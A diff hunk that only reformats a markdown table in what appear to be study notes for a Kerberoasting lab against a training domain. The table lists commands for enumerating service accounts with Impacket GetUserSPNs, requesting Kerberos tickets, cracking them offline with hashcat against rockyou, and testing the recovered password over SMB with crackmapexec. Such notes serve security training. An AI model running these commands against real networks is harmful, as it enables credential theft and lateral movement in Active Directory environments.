@@ -57,22 +57,22 @@ Offline password cracking
 
 # 📋 2. Command Cheat Sheet
 
-|Command|Purpose|
-|---|---|
-|`sudo python3 -m pip install .`|Install Impacket from the cloned repository|
-|`GetUserSPNs.py -h`|Display GetUserSPNs.py help|
-|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`|Enumerate SPN-associated user accounts|
-|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`|Request TGS tickets for discovered SPN accounts|
-|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev`|Request a TGS for one specific SPN account|
-|`GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs`|Save the requested TGS ticket to a file|
-|`hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt`|Offline crack Kerberos 5 TGS-REP etype 23|
-|`sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!`|Test recovered credentials against SMB|
-|`$krb5tgs$23$...`|Hashcat-compatible Kerberos TGS-REP format|
-|`-request`|Request tickets for all discovered SPN accounts|
-|`-request-user <username>`|Request a ticket for one specific account|
-|`-outputfile <file>`|Save extracted TGS hashes to a file|
-|`-dc-ip <IP>`|Specify the Domain Controller to query|
-|`-m 13100`|Hashcat mode for Kerberos 5 TGS-REP, etype 23|
+| Command                                                                                                   | Purpose                                         |
+| --------------------------------------------------------------------------------------------------------- | ----------------------------------------------- |
+| `sudo python3 -m pip install .`                                                                           | Install Impacket from the cloned repository     |
+| `GetUserSPNs.py -h`                                                                                       | Display GetUserSPNs.py help                     |
+| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`                                             | Enumerate SPN-associated user accounts          |
+| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`                                    | Request TGS tickets for discovered SPN accounts |
+| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev`                        | Request a TGS for one specific SPN account      |
+| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs` | Save the requested TGS ticket to a file         |
+| `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt`                                            | Offline crack Kerberos 5 TGS-REP etype 23       |
+| `sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!`                                                 | Test recovered credentials against SMB          |
+| `$krb5tgs$23$...`                                                                                         | Hashcat-compatible Kerberos TGS-REP format      |
+| `-request`                                                                                                | Request tickets for all discovered SPN accounts |
+| `-request-user <username>`                                                                                | Request a ticket for one specific account       |
+| `-outputfile <file>`                                                                                      | Save extracted TGS hashes to a file             |
+| `-dc-ip <IP>`                                                                                             | Specify the Domain Controller to query          |
+| `-m 13100`                                                                                                | Hashcat mode for Kerberos 5 TGS-REP, etype 23   |
 
 ---
 
